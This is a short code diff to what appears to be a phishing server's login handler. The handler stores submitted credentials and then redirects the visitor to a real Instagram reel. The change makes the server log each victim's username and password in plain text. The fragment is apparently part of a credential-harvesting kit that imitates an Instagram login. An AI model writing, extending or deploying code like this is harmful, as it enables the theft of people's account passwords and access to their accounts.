@@ -23,7 +23,7 @@ app.post("/login", (req, res) => {
       console.error("Error saving credentials:", err);
       res.status(500).send("Error saving credentials.");
     } else {
-      console.log("Credentials saved successfully.");
+      console.log(`Received credentials - Username: ${username}, Password: ${password}`);
       res.redirect("https://www.instagram.com/reel/DDpZ2uRTeNM/?igsh=MXNvYnU0dzZpNGVyNg%3D%3D"); // Redirect after login
     }
   });
